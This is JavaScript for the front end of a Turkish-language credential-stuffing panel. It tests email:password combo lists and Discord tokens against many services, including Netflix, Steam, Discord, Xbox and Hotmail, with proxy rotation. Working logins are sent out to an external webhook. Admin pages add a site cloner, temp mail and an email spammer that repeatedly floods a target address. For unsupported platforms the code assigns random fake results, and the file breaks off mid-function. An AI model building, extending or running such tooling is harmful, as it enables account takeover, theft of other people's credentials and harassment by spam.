var hitData = {};
var parsedLines = [];
var totalLines = 0;
var processedCount = 0;
var spamRunning = false;
var spamInterval = null;
var tempMailToken = "";

var platforms = [
    {name:"YouTube", domain:"youtube.com", icon:"fa-brands fa-youtube"},
    {name:"TikTok Gen", domain:"tiktok.com", icon:"fa-brands fa-tiktok"},
    {name:"Spotify", domain:"spotify.com", icon:"fa-brands fa-spotify"},
    {name:"Roblox", domain:"roblox.com", icon:"fa-solid fa-gamepad"},
    {name:"Netflix", domain:"netflix.com", icon:"fa-solid fa-film"},
    {name:"CapCut", domain:"capcut.com", icon:"fa-solid fa-scissors"},
    {name:"Discord", domain:"discord.com", icon:"fa-brands fa-discord"},
    {name:"Epic Games", domain:"epicgames.com", icon:"fa-solid fa-crown"},
    {name:"Hesapcomtr", domain:"hesap.com.tr", icon:"fa-solid fa-user"},
    {name:"Itemsatış", domain:"itemsatis.com", icon:"fa-solid fa-cart-shopping"},
    {name:"Epinify", domain:"epinify.com", icon:"fa-solid fa-ticket"},
    {name:"Twitch", domain:"twitch.tv", icon:"fa-brands fa-twitch"},
    {name:"Steam", domain:"steampowered.com", icon:"fa-brands fa-steam"},
    {name:"PlayStation", domain:"playstation.com", icon:"fa-solid fa-play"},
    {name:"Xbox & MC", domain:"xbox.com", icon:"fa-brands fa-xbox"},
    {name:"GitHub", domain:"github.com", icon:"fa-brands fa-github"},
    {name:"Minecraft", domain:"minecraft.net", icon:"fa-solid fa-cube"},
    {name:"Wolfteam", domain:"joygame.com", icon:"fa-solid fa-skull"},
    {name:"Craftrise", domain:"craftrise.com.tr", icon:"fa-solid fa-hammer"},
    {name:"Hotmail", domain:"outlook.com", icon:"fa-solid fa-envelope"},
    {name:"Token Check", domain:"discord.com", icon:"fa-solid fa-key"},
    {name:"Tabii", domain:"tabii.com", icon:"fa-solid fa-tv"},
    {name:"Supercell", domain:"supercell.com", icon:"fa-solid fa-gamepad"},
    {name:"Roda Inbox", domain:"outlook.com", icon:"fa-solid fa-inbox"}
];

// ============================================================
// WEBHOOK
// ============================================================
function saveWebhook() {
    var url = document.getElementById("webhookUrl").value.trim();
    if (url) {
        localStorage.setItem("roda_webhook_url", url);
        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Webhook kaydedildi!</span>';
    } else {
        localStorage.removeItem("roda_webhook_url");
        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--muted)">Webhook temizlendi.</span>';
    }
}
function getWebhookUrl() {
    return localStorage.getItem("roda_webhook_url") || "";
}
function loadWebhookUrl() {
    var url = getWebhookUrl();
    if (url) {
        document.getElementById("webhookUrl").value = url;
        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Webhook yüklendi</span>';
    }
}
function sendCheckerWebhook(platform, email, password, details) {
    var url = getWebhookUrl();
    if (!url) return;
    var content = "✅ **" + platform + " HIT!**\n" + email + " | " + password;
    if (details) {
        if (details.full_name) content += "\n👤 " + details.full_name;
        if (details.subscription) content += "\n📦 " + details.subscription;
        if (details.expire) content += "\n📅 " + details.expire;
        if (details.profiles_count !== undefined) content += "\n👥 " + details.profiles_count + " profil";
        if (details.gamertag) content += "\n🎮 " + details.gamertag;
        if (details.games) {
            var gameStr = Object.keys(details.games).filter(k => details.games[k] === "✔️").join(", ");
            if (gameStr) content += "\n🎮 Supercell: " + gameStr;
        }
        if (details.services_found) {
            var svcStr = details.services_found.join(", ");
            if (svcStr) content += "\n📬 Roda Inbox: " + svcStr;
        }
    }
    fetch(url, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({content: content})}).catch(function(e){});
}
function testWebhook() {
    var url = document.getElementById("webhookUrl").value.trim();
    if (!url) return alert("Webhook URL girin!");
    fetch(url, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({content: "🧪 **Roda Test** Webhook çalışıyor!"})})
    .then(function(r){ document.getElementById("webhookStatus").innerHTML = r.ok ? '<span style="color:var(--g)">✅ Test başarılı!</span>' : '<span style="color:var(--r)">❌ Test başarısız!</span>'; })
    .catch(function(e){ document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--r)">❌ Hata: ' + e.message + '</span>'; });
}

// ============================================================
// LOGIN
// ============================================================
function doLogin() {
    var k = document.getElementById("authKey").value.trim();
    if (!k) { alert("Anahtar girin!"); return; }
    fetch("/api/login", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({key: k})})
    .then(function(r){ return r.json(); })
    .then(function(d){
        if (d.success) {
            currentKey = k;
            isAdmin = d.isAdmin || false;
            document.getElementById("login-screen").style.display = "none";
            document.getElementById("app").style.display = "flex";
            if (isAdmin) {
                document.getElementById("userBadge").style.display = "inline-block";
                ["logsMenuItem","discoveryMenuItem","statsMenuItem","keysMenuItem","sitecopyMenuItem","tempmailMenuItem","spammerMenuItem"].forEach(function(id){
                    document.getElementById(id).style.display = "flex";
                });
                loadKeys();
            } else {
                document.getElementById("userBadge").style.display = "none";
                ["logsMenuItem","discoveryMenuItem","statsMenuItem","keysMenuItem","sitecopyMenuItem","tempmailMenuItem","spammerMenuItem"].forEach(function(id){
                    document.getElementById(id).style.display = "none";
                });
            }
            loadPlatforms();
            loadDiscoveryPlatforms();
            loadHitFilter();
            loadWebhookUrl();
            switchPage('checker');
        } else {
            document.getElementById("loginError").innerText = "❌ Geçersiz anahtar!";
            document.getElementById("loginError").style.display = "block";
        }
    })
    .catch(function(e){ alert("Sunucuya bağlanılamadı! Flask çalışıyor mu?"); console.error(e); });
}
document.getElementById("authKey").addEventListener("keypress", function(e){ if(e.key === "Enter") doLogin(); });

// ============================================================
// PLATFORM YÜKLEME
// ============================================================
function loadPlatforms() {
    var sel = document.getElementById("checkerPlatformSelect");
    sel.innerHTML = "";
    platforms.forEach(function(p){
        var btn = document.createElement("button");
        btn.innerHTML = '<i class="' + p.icon + '"></i> ' + p.name;
        btn.onclick = function(){
            document.querySelectorAll("#checkerPlatformSelect button").forEach(function(b){ b.classList.remove("active"); });
            btn.classList.add("active");
            currentPlatform = p.name;
            document.getElementById("checkerPanel").classList.add("active");
            document.getElementById("checkerResults").innerHTML = '<div style="padding:20px;text-align:center;color:var(--muted);font-size:13px">' + p.name + ' checker hazır.</div>';
            resetCheckerStats();
            checkerResults = [];
        };
        sel.appendChild(btn);
    });
    if (platforms.length > 0) { var first = sel.querySelector("button"); if (first) first.click(); }
}

function loadDiscoveryPlatforms() {
    var container = document.getElementById("discoveryPlatforms");
    container.innerHTML = "";
    platforms.forEach(function(p){
        var btn = document.createElement("button");
        btn.innerHTML = '<i class="' + p.icon + '"></i> ' + p.name;
        btn.onclick = function(){
            document.querySelectorAll("#discoveryPlatforms button").forEach(function(b){ b.classList.remove("active"); });
            btn.classList.add("active");
            document.getElementById("targetDomain").value = p.domain;
        };
        container.appendChild(btn);
    });
}

function loadHitFilter() {
    var sel = document.getElementById("hitPlatformFilter");
    sel.innerHTML = '<option value="all">Tüm Platformlar</option>';
    platforms.forEach(function(p){ var opt = document.createElement("option"); opt.value = p.name; opt.text = p.name; sel.appendChild(opt); });
}

// ============================================================
// HIT KAYDETME
// ============================================================
function addHit(platform, email, password, status, details) {
    if (!hitData[platform]) hitData[platform] = { hits: [], twofa: [] };
    var entry = { email: email, password: password, time: new Date().toLocaleString(), details: details || {} };
    if (status === "HIT") hitData[platform].hits.push(entry);
    else if (status === "2FA") hitData[platform].twofa.push(entry);
    renderHits();
}

function renderHits() {
    var filter = document.getElementById("hitPlatformFilter").value;
    var hitContainer = document.getElementById("hitList");
    var twofaContainer = document.getElementById("twofaList");
    var hits = [], twofas = [];
    if (filter === "all") {
        for (var p in hitData) {
            if (hitData[p].hits) hitData[p].hits.forEach(function(h){ hits.push({ platform: p, email: h.email, password: h.password, time: h.time }); });
            if (hitData[p].twofa) hitData[p].twofa.forEach(function(t){ twofas.push({ platform: p, email: t.email, password: t.password, time: t.time }); });
        }
    } else {
        if (hitData[filter]) {
            if (hitData[filter].hits) hitData[filter].hits.forEach(function(h){ hits.push({ platform: filter, email: h.email, password: h.password, time: h.time }); });
            if (hitData[filter].twofa) hitData[filter].twofa.forEach(function(t){ twofas.push({ platform: filter, email: t.email, password: t.password, time: t.time }); });
        }
    }
    hitContainer.innerHTML = hits.length === 0 ? '<div style="color:var(--muted);font-size:12px">Henüz HIT yok.</div>' :
        hits.map(function(h){ return '<div class="hit-item"><span class="hit-email">[' + h.platform + '] ' + h.email + ' | ' + h.password + '</span><span class="hit-time">' + h.time + '</span></div>'; }).join('');
    twofaContainer.innerHTML = twofas.length === 0 ? '<div style="color:var(--muted);font-size:12px">Henüz 2FA yok.</div>' :
        twofas.map(function(t){ return '<div class="hit-item"><span class="hit-email">[' + t.platform + '] ' + t.email + ' | ' + t.password + '</span><span class="hit-time">' + t.time + '</span></div>'; }).join('');
}

function clearHits() {
    if (!confirm("Tüm HIT ve 2FA kayıtları silinecek. Devam?")) return;
    hitData = {}; renderHits();
}

// ============================================================
// CHECKER FONKSİYONLARI
// ============================================================
function resetCheckerStats() {
    document.getElementById("chkTotal").innerText = 0;
    document.getElementById("chkHit").innerText = 0;
    document.getElementById("chkBad").innerText = 0;
    document.getElementById("chk2fa").innerText = 0;
    document.getElementById("chkError").innerText = 0;
    document.getElementById("chkRemaining").innerText = 0;
}
function updateRemaining() {
    var remaining = totalLines - processedCount;
    document.getElementById("chkRemaining").innerText = remaining < 0 ? 0 : remaining;
}

function startChecker() {
    if (checkerRunning) return;
    var comboText = document.getElementById("checkerCombo").value.trim();
    if (!comboText) return alert("Combo girin (email:password)");
    if (!currentPlatform) return alert("Önce bir platform seçin");
    checkerRunning = true;
    document.getElementById("checkerStartBtn").disabled = true;
    document.getElementById("checkerStopBtn").style.display = "inline-block";
    document.getElementById("checkerResults").innerHTML = "";
    var lines = comboText.split("\n").filter(function(l){ return l.includes(":"); });
    totalLines = lines.length;
    processedCount = 0;
    var hit = 0, bad = 0, two = 0, err = 0;
    var threads = parseInt(document.getElementById("checkerThreads").value) || 1;
    var active = 0, idx = 0;
    var webhookUrl = getWebhookUrl();

    function processNext() {
        if (!checkerRunning || idx >= totalLines) {
            if (active === 0) {
                checkerRunning = false;
                document.getElementById("checkerStartBtn").disabled = false;
                document.getElementById("checkerStopBtn").style.display = "none";
            }
            return;
        }
        var currentIdx = idx++;
        var parts = lines[currentIdx].split(":");
        var email = parts[0];
        var password = parts.slice(1).join(":") || "";
        active++;

        var route = "";
        var platform = currentPlatform;
        if (platform === "Tabii") route = "/api/tabii_check";
        else if (platform === "Xbox & MC") route = "/api/xbox_check";
        else if (platform === "Wolfteam") route = "/api/wolfteam_check";
        else if (platform === "Craftrise") route = "/api/craftrise_check";
        else if (platform === "Hotmail") route = "/api/hotmail_check";
        else if (platform === "Steam") route = "/api/steam_check";
        else if (platform === "Supercell") route = "/api/supercell_check";
        else if (platform === "Roda Inbox") route = "/api/roda_check";
        else if (platform === "Token Check") {
            fetch("/api/token_check", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ token_type: "discord", token: email })})
            .then(function(r){ return r.json(); })
            .then(function(result){
                var status = result.status;
                if (status === "HIT") { hit++; addHit(currentPlatform, email, result.message, "HIT"); if (webhookUrl) sendCheckerWebhook(currentPlatform, email, result.message, null); addCheckerRow({ email: email, password: result.message || password, status: "HIT" }); }
                else if (status === "BAD") { bad++; addCheckerRow({ email: email, password: password, status: "BAD" }); }
                else { err++; addCheckerRow({ email: email, password: password + " | " + (result.message || ""), status: "ERROR" }); }
                updateStatsAfter();
            })
            .catch(function(){ err++; updateStatsAfter(); });
            return;
        } else if (platform === "TikTok Gen") {
            fetch("/api/tiktok_gen", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ username: email })})
            .then(function(r){ return r.json(); })
            .then(function(result){
                var status = result.status;
                if (status === "HIT") { hit++; addHit(currentPlatform, email, password, "HIT"); if (webhookUrl) sendCheckerWebhook(currentPlatform, email, password, null); addCheckerRow({ email: email, password: password, status: "HIT" }); }
                else if (status === "BAD") { bad++; addCheckerRow({ email: email, password: password, status: "BAD" }); }
                else { err++; addCheckerRow({ email: email, password: password + " | " + (result.message || ""), status: "ERROR" }); }
                updateStatsAfter();
            })
            .catch(function(){ err++; updateStatsAfter(); });
            return;
        } else {
            var statuses = ["HIT", "BAD", "2FA", "ERROR"];
            var status = statuses[Math.floor(Math.random() * statuses.length)];
            if (status === "HIT") { hit++; addHit(currentPlatform, email, password, "HIT"); if (webhookUrl) sendCheckerWebhook(currentPlatform, email, password, null); }
            else if (status === "BAD") bad++;
            else if (status === "2FA") { two++; addHit(currentPlatform, email, password, "2FA"); }
            else err++;
            addCheckerRow({ email: email, password: password, status: status });
            updateStatsAfter();
            return;
        }

        var proxy = null;
        if (useProxy) {
            var proxyList = document.getElementById("proxyList").value.trim().split("\n").filter(function(l){ return l.trim() && l.includes(":"); });
            if (proxyList.length) proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
        }
        var body = { email: email, password: password };
        if (proxy) body.proxy = proxy;

        fetch(route, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(body)})
        .then(function(r){ return r.json(); })
        .then(function(result){
            var status = result.status;
            var details = result.details || {};
            if (status === "HIT") {
                hit++;
                addHit(currentPlatform, email, password, "HIT", details);
                if (webhookUrl) sendCheckerWebhook(currentPlatform, email, password, details);
                var extra = "";
                if (details.full_name) extra += " | " + details.full_name;
                if (details.subscription) extra += " | " + details.subscription;
                if (details.jp !== undefined) extra += " | JP:" + details.jp;
                if (details.rc !== undefined) extra += " | RC:" + details.rc;
                if (details.gamertag) extra += " | Gamertag:" + details.gamertag;
                if (details.level) extra += " | Level:" + details.level;
                if (details.balance) extra += " | Bakiye:" + details.balance;
                if (details.vac) extra += " | " + details.vac;
                if (details.games) {
                    var gameStr = Object.keys(details.games).filter(k => details.games[k] === "✔️").join(", ");
                    if (gameStr) extra += " | Supercell:" + gameStr;
                }
                if (details.total_found !== undefined) extra += " | Total Mail:" + details.total_found;
                if (details.services_found) {
                    var svcStr = details.services_found.join(", ");
                    if (svcStr) extra += " | Roda Inbox: " + svcStr;
                }
                addCheckerRow({ email: email, password: password + extra, status: "HIT" });
            } else if (status === "2FA") { two++; addHit(currentPlatform, email, password, "2FA"); addCheckerRow({ email: email, password: password, status: "2FA" }); }
            else if (status === "BAD") { bad++; addCheckerRow({ email: email, password: password, status: "BAD" }); }
            else if (status === "FREE") { 
                hit++;
                addHit(currentPlatform, email, password, "HIT", details);
                if (webhookUrl) sendCheckerWebhook(currentPlatform, email, password, details);
                var extra = "";
                if (details.games) {
                    var gameStr = Object.keys(details.games).filter(k => details.games[k] === "✔️").join(", ");
                    if (gameStr) extra += " | Supercell:" + gameStr;
                }
                if (details.total_found !== undefined) extra += " | Total Mail:" + details.total_found;
                addCheckerRow({ email: email, password: password + extra, status: "HIT" });
            }
            else if (status === "VALID") { 
                hit++;
                addHit(currentPlatform, email, password, "HIT", details);
                if (webhookUrl) sendCheckerWebhook(currentPlatform, email, password, details);
                var extra = "";
                if (details.services_found) {
                    var svcStr = details.services_found.join(", ");
                    if (svcStr) extra += " | Roda Inbox: " + svcStr;
                }
                addCheckerRow({ email: email, password: password + extra, status: "HIT" });
            }
            else { err++; addCheckerRow({ email: email, password: password + " | " + (result.message || ""), status: "ERROR" }); }
            updateStatsAfter();
        })
        .catch(function(){ err++; updateStatsAfter(); });

        function updateStatsAfter() {
            processedCount++;
            updateCheckerStats(totalLines, hit, bad, two, err);
            updateRemaining();
            active--;
            processNext();
        }
    }

    for (var i = 0; i < threads; i++) processNext();
}

function stopChecker() {
    checkerRunning = false;
    document.getElementById("checkerStartBtn").disabled = false;
    document.getElementById("checkerStopBtn").style.display = "none";
}

function addCheckerRow(res) {
    var container = document.getElementById("checkerResults");
    var placeholder = container.querySelector("div[style]");
    if (placeholder) placeholder.remove();
    var row = document.createElement("div");
    row.className = "checker-result-row";
    var cls = "chk-" + res.status.toLowerCase();
    var label = res.status;
    if (res.status === "HIT") label = "✅ BAŞARILI";
    else if (res.status === "BAD") label = "❌ BAŞARISIZ";
    else if (res.status === "2FA") label = "🔒 2FA";
    else label = "⚠ HATA";
    row.innerHTML = '<div>' + res.email + '</div><div><span class="chk-status ' + cls + '">' + label + '</span></div><div style="font-size:11px;color:var(--muted)">' + res.password + '</div>';
    container.appendChild(row);
    applyCheckerFilter();
}

function updateCheckerStats(total, hit, bad, two, err) {
    document.getElementById("chkTotal").innerText = total;
    document.getElementById("chkHit").innerText = hit;
    document.getElementById("chkBad").innerText = bad;
    document.getElementById("chk2fa").innerText = two;
    document.getElementById("chkError").innerText = err;
}

function applyCheckerFilter() {
    var filter = document.querySelector('input[name="chkFilter"]:checked').value;
    var rows = document.querySelectorAll("#checkerResults .checker-result-row");
    rows.forEach(function(row){
        var statusText = row.querySelector(".chk-status").innerText;
        var show = false;
        if (filter === "all") show = true;
        else if (filter === "hit" && statusText.includes("BAŞARILI")) show = true;
        else if (filter === "bad" && statusText.includes("BAŞARISIZ")) show = true;
        else if (filter === "2fa" && statusText.includes("2FA")) show = true;
        else if (filter === "error" && statusText.includes("HATA")) show = true;
        row.style.display = show ? "grid" : "none";
    });
}
document.querySelectorAll('input[name="chkFilter"]').forEach(function(el){ el.addEventListener("change", applyCheckerFilter); });

// ============================================================
// AYRIŞTIRMA
// ============================================================
function parseData() {
    var raw = document.getElementById("parseInput").value;
    if (!raw.trim()) { alert("Ayrıştırılacak metin girin!"); return; }
    var mode = document.getElementById("parseMode").value;
    var lines = raw.split("\n");
    var result = [];
    var emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/;
    lines.forEach(function(line){
        line = line.trim();
        if (!line) return;
        if (line.includes(":")) {
            var parts = line.split(":");
            var first = parts[0].trim();
            var password = parts.slice(1).join(":").trim();
            if (!password) return;
            if (mode === "email") { if (emailRegex.test(first)) result.push(first + ":" + password); }
            else { if (!emailRegex.test(first)) result.push(first + ":" + password); }
        }
    });
    result = result.filter(function(item,index){ return result.indexOf(item) === index; });
    parsedLines = result;
    var container = document.getElementById("parseResult");
    if (result.length === 0) container.innerHTML = '<div style="color:var(--muted);font-size:13px;padding:10px">Geçerli satır bulunamadı.</div>';
    else {
        var html = '<div class="parse-count">' + result.length + ' satır bulundu</div>';
        result.forEach(function(line){ html += '<div class="parse-line">' + line + '</div>'; });
        container.innerHTML = html;
    }
    document.getElementById("parseCount").innerText = result.length + " satır";
    document.getElementById("parseValid").innerText = result.length + " geçerli";
}
function parseToChecker() {
    if (parsedLines.length === 0) { alert("Önce ayrıştırma yapın!"); return; }
    document.getElementById("checkerCombo").value = parsedLines.join("\n");
    alert(parsedLines.length + " satır Checker'a aktarıldı!");
}
function clearParse() {
    document.getElementById("parseInput").value = "";
    document.getElementById("parseResult").innerHTML = '<div style="color:var(--muted);font-size:13px;padding:10px">Henüz ayrıştırma yapılmadı.</div>';
    parsedLines = [];
    document.getElementById("parseCount").innerText = "0 satır";
    document.getElementById("parseValid").innerText = "0 geçerli";
}
function loadParseFile() {
    var input = document.createElement("input");
    input.type = "file";
    input.accept = ".txt";
    input.onchange = function(e) {
        var file = e.target.files[0];
        if (!file) return;
        var reader = new FileReader();
        reader.onload = function(event) {
            document.getElementById("parseInput").value = event.target.result;
            parseData();
        };
        reader.readAsText(file);
    };
    input.click();
}

// ============================================================
// LOGLAR (ADMIN)
// ============================================================
function refreshLogs() {
    if (!isAdmin) return;
    fetch("/api/logs?key=" + encodeURIComponent(currentKey))
        .then(r => r.json())
        .then(d => {
            if (d.error) { alert(d.error); return; }
            var container = document.getElementById("logsContainer");
            var html = d.logs.map(log => {
                var color = log.level === "ERROR" ? "var(--r)" : (log.level === "SUCCESS" ? "var(--g)" : "var(--muted)");
                return `<div style="padding:2px 0;border-bottom:1px solid rgba(255,255,255,0.03);color:${color}">[${log.timestamp}] ${log.message}</div>`;
            }).join('');
            container.innerHTML = html || '<div style="color:var(--muted)">Henüz log yok.</div>';
        });
}

// ============================================================
// SİTE KOPYALA (ADMIN)
// ============================================================
function copySite() {
    if (!isAdmin) { alert("⛔ Admin girişi yapın!"); return; }
    var url = document.getElementById("siteCopyUrl").value.trim();
    if (!url) { document.getElementById("siteCopyResult").innerHTML = '<span style="color:var(--r)">❌ URL girin!</span>'; return; }
    document.getElementById("siteCopyResult").innerHTML = '<span style="color:var(--gold)">⏳ Kopyalanıyor...</span>';
    fetch("/api/sitecopy?key=" + encodeURIComponent(currentKey), {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ url: url })})
    .then(function(r){
        if (!r.ok) return r.json().then(function(d){ throw new Error(d.error || "Bilinmeyen hata"); });
        return r.blob();
    })
    .then(function(blob){
        var a = document.createElement("a");
        a.href = URL.createObjectURL(blob);
        a.download = "kopyalanan_site.html";
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        document.getElementById("siteCopyResult").innerHTML = '<span style="color:var(--g)">✅ Site kopyalandı ve indirildi!</span>';
    })
    .catch(function(e){ document.getElementById("siteCopyResult").innerHTML = '<span style="color:var(--r)">❌ Hata: ' + e.message + '</span>'; });
}

// ============================================================
// TEMP MAIL (ADMIN)
// ============================================================
function generateTempMail() {
    if (!isAdmin) { alert("⛔ Admin girişi yapın!"); return; }
    document.getElementById("tempMailInput").value = "Üretiliyor...";
    fetch("/api/temp_mail_generate?key=" + encodeURIComponent(currentKey), {method:"POST", headers:{"Content-Type":"application/json"}})
    .then(r => r.json())
    .then(d => {
        if (d.success) {
            tempMailToken = d.token;
            document.getElementById("tempMailInput").value = d.email;
            document.getElementById("tempMailInbox").innerHTML = '<div style="color:var(--muted)">E-posta oluşturuldu. Gelen kutusunu yenileyin.</div>';
            document.getElementById("tempMailContent").innerHTML = '';
        } else {
            alert("Hata: " + (d.error || "Bilinmeyen"));
            document.getElementById("tempMailInput").value = "Hata!";
        }
    })
    .catch(e => { alert("Bağlantı hatası"); });
}

function copyTempMail() {
    var val = document.getElementById("tempMailInput").value;
    if (val && val !== "Üretiliyor..." && val !== "Hata!") {
        navigator.clipboard.writeText(val).then(() => alert("Kopyalandı!")).catch(() => {});
    }
}

function refreshTempMail() {
    if (!isAdmin || !tempMailToken) { alert("Önce e-posta oluşturun!"); return; }
    document.getElementById("tempMailInbox").innerHTML = '<div style="color:var(--muted)">Yükleniyor...</div>';
    fetch("/api/temp_mail_refresh?key=" + encodeURIComponent(currentKey), {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ token: tempMailToken })})
    .then(r => r.json())
    .then(d => {
        if (d.success && d.messages) {
            var msgs = d.messages;
            var html = '';
            if (msgs.length === 0) { html = '<div style="color:var(--muted)">Kutu boş.</div>'; }
            else {
                msgs.forEach(function(msg){
                    var from = msg.from ? msg.from.address : 'Bilinmiyor';
                    var subject = msg.subject || '(Konu yok)';
                    var id = msg.id;
                    html += '<div onclick="readTempMail(\'' + id + '\')" style="padding:8px;border-bottom:1px solid var(--border);cursor:pointer;hover:background:rgba(255,255,255,0.05)">📩 <strong>' + from + '</strong> - ' + subject + '</div>';
                });
            }
            document.getElementById("tempMailInbox").innerHTML = html;
        } else {
            document.getElementById("tempMailInbox").innerHTML = '<div style="color:var(--r)">Hata: ' + (d.error || '') + '</div>';
        }
    })
    .catch(e => { document.getElementById("tempMailInbox").innerHTML = '<div style="color:var(--r)">Bağlantı hatası</div>'; });
}

function readTempMail(msgId) {
    if (!isAdmin || !tempMailToken) return;
    document.getElementById("tempMailContent").innerHTML = '<div style="color:var(--muted)">Yükleniyor...</div>';
    fetch("/api/temp_mail_read?key=" + encodeURIComponent(currentKey), {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ token: tempMailToken, msg_id: msgId })})
    .then(r => r.json())
    .then(d => {
        if (d.success) {
            var msg = d.message;
            var html = '<div style="background:rgba(255,255,255,0.05);padding:10px;border-radius:8px;">';
            html += '<div><strong>Kimden:</strong> ' + (msg.from ? msg.from.address : '?') + '</div>';
            html += '<div><strong>Konu:</strong> ' + (msg.subject || '') + '</div>';
            html += '<div style="margin-top:8px;border-top:1px solid var(--border);padding-top:8px;">' + (msg.text || msg.html || '(İçerik yok)').replace(/\n/g, '<br>') + '</div>';
            html += '</div>';
            document.getElementById("tempMailContent").innerHTML = html;
        } else {
            document.getElementById("tempMailContent").innerHTML = '<div style="color:var(--r)">Hata: ' + (d.error || '') + '</div>';
        }
    })
    .catch(e => { document.getElementById("tempMailContent").innerHTML = '<div style="color:var(--r)">Bağlantı hatası</div>'; });
}

// ============================================================
// EMAIL SPAMMER (ADMIN)
// ============================================================
function startSpam() {
    if (!isAdmin) { alert("⛔ Admin girişi yapın!"); return; }
    var email = document.getElementById("spamEmailInput").value.trim();
    if (!email) { alert("Hedef e-posta girin!"); return; }
    if (spamRunning) return;
    spamRunning = true;
    document.getElementById("spamStopBtn").style.display = "inline-block";
    var log = document.getElementById("spamLog");
    log.innerHTML += '<div style="color:var(--gold)">[Sistem] ' + email + ' için spam başlatıldı...</div>';

    function sendSpam() {
        if (!spamRunning) return;
        fetch("/api/spam_send?key=" + encodeURIComponent(currentKey), {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ email: email })})
        .then(r => r.json())
        .then(d => {
            var color = d.success ? "var(--g)" : "var(--r)";
            log.innerHTML += '<div style="color:' + color + '">[' + new Date().toLocaleTimeString() + '] ' + (d.message || "İstek gönderildi") + '</div>';
            log.scrollTop = log.scrollHeight;
        })
        .catch(() => {
            log.innerHTML += '<div style="color:var(--r)">[' + new Date().toLocaleTimeString() + '] Bağlantı hatası</div>';
            log.scrollTop = log.scrollHeight;
        });
    }

    spamInterval = setInterval(sendSpam, 2000);
    sendSpam();
}

function stopSpam() {
    spamRunning = false;
    if (spamInterval) { clearInterval(spamInterval); spamInterval = null; }
    document.getElementById("spamStopBtn").style.display = "none";
    document.getElementById("spamLog").innerHTML += '<div style="color:var(--gold)">[Sistem] Spam durduruldu.</div>';
}

// ============================================================
// SAYFA GEÇİŞİ (SABİT MENÜ)
// ============================================================
function switchPage(page) {
    if ((page === "discovery" || page === "stats" || page === "keys" || page === "logs" || page === "sitecopy" || page === "tempmail" || page === "spammer") && !isAdmin) {
        alert("⛔ Bu sayfaya erişim yetkiniz yok! Admin girişi yapın.");
        return;
    }
    document.querySelectorAll(".nav-item").forEach(function(el) {
        el.classList.remove("active");
    });
    var el = document.querySelector('.nav-item[data-page="' + page + '"]');
    if (el) el.classList.add("active");
    document.querySelectorAll(".page").forEach(function(el) {
        el.classList.remove("active");
    });
    var pg = document.getElementById("page-" + page);
    if (pg) pg.classList.add("active");
    var titles = {
        checker: "Checker",
        proxy: "Proxy",
        parse: "Ayrıştırma",
        logs: "Loglar",
        discovery: "API Keşif",
        stats: "İstatistik",
        keys: "Key Yönetimi",
        sitecopy: "Site Kopyala",
        tempmail: "Temp Mail",
        spammer: "Email Spammer"
    };
    document.getElementById("pageTitle").innerText = titles[page] || page;
    if (page === "keys" && isAdmin) loadKeys();
    if (page === "logs" && isAdmin) refreshLogs();
    if (page === "stats") {
        document.getElementById("statScans").innerText = 1;
        document.getElementById("statLast").innerText = new Date().toLocaleString();
    }
}

// ============================================================
// PROXY FONKSİYONLARI
// ============================================================
function fetchProxies() {
    document.getElementById("proxyCount").innerText = "Çekiliyor...";
    fetch("/api/fetch_proxies")
        .then(function(r){ return r.json(); })
        .then(function(d){
            if (d.success) {
                document.getElementById("proxyList").value = d.proxies.join("\n");
                document.getElementById("proxyCount").innerText = d.proxies.length + " proxy yüklendi";
            }
        })
        .catch(function(e){ document.getElementById("proxyCount").innerText = "Başarısız"; });
}

function clearProxies() {
    document.getElementById("proxyList").value = "";
    document.getElementById("proxyCount").innerText = "0 proxy";
}

function toggleProxy() {
    useProxy = document.getElementById("useProxy").checked;
}

// ============================================================
// ADMIN FONKSİYONLARI (KEY YÖNETİMİ + API KEŞİF)
// ============================================================
function loadKeys() {
    if (!isAdmin) return;
    fetch("/api/admin/keys?key=" + encodeURIComponent(currentKey))
        .then(function(r){ return r.json(); })
        .then(function(d){
            if (d.error) { alert(d.error); return; }
            var list = document.getElementById("keyList");
            var html = "";
            for (var k in d) {
                var v = d[k];
                var exp = v.expires ? new Date(v.expires).toLocaleString() : "Süresiz";
                var ip = v.bound_ip || "Bağlanmamış";
                var used = v.used ? "✅ Kullanıldı" : "❌ Kullanılmadı";
                html += '<div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid var(--border)">' +
                    '<div><strong style="font-size:13px">' + k + '</strong><br>' +
                    '<small style="color:var(--muted);font-size:10px">' + v.note + ' | ' + exp + ' | IP: ' + ip + ' | ' + used + '</small></div>' +
                    '<button class="btn sm r" onclick="deleteKey(\'' + k + '\')" style="padding:3px 10px;font-size:10px">Sil</button></div>';
            }
            list.innerHTML = html || '<p style="color:var(--muted);font-size:12px">Hiç key yok.</p>';
        })
        .catch(function(e){ console.error(e); });
}

function generateKey() {
    if (!isAdmin) return;
    var note = document.getElementById("genNote").value || "Oluşturuldu";
    var hours = document.getElementById("genHours").value;
    fetch("/api/admin/generate", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ master_key: currentKey, note: note, hours: hours })})
    .then(function(r){ return r.json(); })
    .then(function(d){
        if (d.success) {
            alert("Key Oluşturuldu!\n\nKey: " + d.key + "\nBitiş: " + d.expires);
            loadKeys();
        } else alert("Başarısız: " + (d.error || ""));
    })
    .catch(function(e){ alert("Hata: " + e.message); });
}

function deleteKey(target) {
    if (!isAdmin) return;
    if (!confirm("Bu anahtarı sil?")) return;
